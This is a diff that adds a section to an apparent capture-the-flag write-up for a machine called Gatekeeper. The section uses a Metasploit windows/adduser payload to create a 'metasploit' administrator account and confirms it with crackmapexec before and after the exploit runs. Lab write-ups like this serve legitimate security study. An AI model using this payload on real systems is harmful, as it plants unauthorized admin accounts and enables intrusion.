@@ -461,3 +461,38 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Users\admin\Desktop>
 
 ```
+
+
+Since the prompt was talking about firewalls, lets see if I can add a user instead of dealing with firewalls.
+
+```bash
+msf6 payload(windows/adduser) > show options
+
+Module options (payload/windows/adduser):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   CUSTOM                     no        Custom group name to be used instead of default
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   PASS      Metasploit$1     yes       The password for this user
+   USER      metasploit       yes       The username to create
+   WMIC      false            yes       Use WMIC on the target to resolve administrators group
+
+```
+
+With this as the payload, before sending it (using cme to check if user exists)
+
+![image](https://user-images.githubusercontent.com/83407557/185809287-c95235a4-155b-4ba3-bdf0-703937559968.png)
+
+However after running exploit
+
+![image](https://user-images.githubusercontent.com/83407557/185809308-a63582f2-8325-4bfb-8333-222cbfc68f6e.png)
+
+I see that now that user exists and is an admin
+
+![image](https://user-images.githubusercontent.com/83407557/185809320-df3c5e40-96bb-4242-876d-8cca1bb818fc.png)
+
+I now have 2 potential exploits (one that bypasses firewalls) that I can use against the machine Gatekeeper.
+
+# Storming the gate.
+
